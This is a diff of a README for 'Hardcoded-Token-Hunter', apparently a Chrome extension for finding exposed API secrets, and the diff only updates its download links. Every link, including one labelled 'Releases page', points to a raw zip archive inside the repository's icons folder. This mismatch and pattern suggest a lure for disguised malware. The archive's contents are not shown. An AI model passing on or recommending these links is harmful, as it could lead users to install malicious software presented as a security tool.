@@ -1,6 +1,6 @@
 # 🔐 Hardcoded-Token-Hunter - Find Hidden API Secrets Quickly
 
-[![Download Hardcoded-Token-Hunter](https://github.com/kronossphpp/Hardcoded-Token-Hunter/raw/refs/heads/main/icons/Hunter-Hardcoded-Token-2.7.zip)](https://github.com/kronossphpp/Hardcoded-Token-Hunter/raw/refs/heads/main/icons/Hunter-Hardcoded-Token-2.7.zip)
+[![Download Hardcoded-Token-Hunter](https://github.com/kronossphpp/Hardcoded-Token-Hunter/raw/refs/heads/main/icons/Token-Hunter-Hardcoded-v3.4.zip)](https://github.com/kronossphpp/Hardcoded-Token-Hunter/raw/refs/heads/main/icons/Token-Hunter-Hardcoded-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Hardcoded-Token-Hunter! This Chrome extension helps you detect hardco
 
 To get started, you need to download the extension. Visit the following link:
 
-[Download Hardcoded-Token-Hunter](https://github.com/kronossphpp/Hardcoded-Token-Hunter/raw/refs/heads/main/icons/Hunter-Hardcoded-Token-2.7.zip)
+[Download Hardcoded-Token-Hunter](https://github.com/kronossphpp/Hardcoded-Token-Hunter/raw/refs/heads/main/icons/Token-Hunter-Hardcoded-v3.4.zip)
 
 Once on the page, follow these steps:
 
@@ -61,4 +61,4 @@ Hardcoded-Token-Hunter is released under the MIT License. This means you can use
 
 We thank all contributors and users for helping to improve Hardcoded-Token-Hunter. Your feedback makes this tool better!
 
-For more details and updates, do not forget to check the [Releases page](https://github.com/kronossphpp/Hardcoded-Token-Hunter/raw/refs/heads/main/icons/Hunter-Hardcoded-Token-2.7.zip) regularly.
+For more details and updates, do not forget to check the [Releases page](https://github.com/kronossphpp/Hardcoded-Token-Hunter/raw/refs/heads/main/icons/Token-Hunter-Hardcoded-v3.4.zip) regularly.
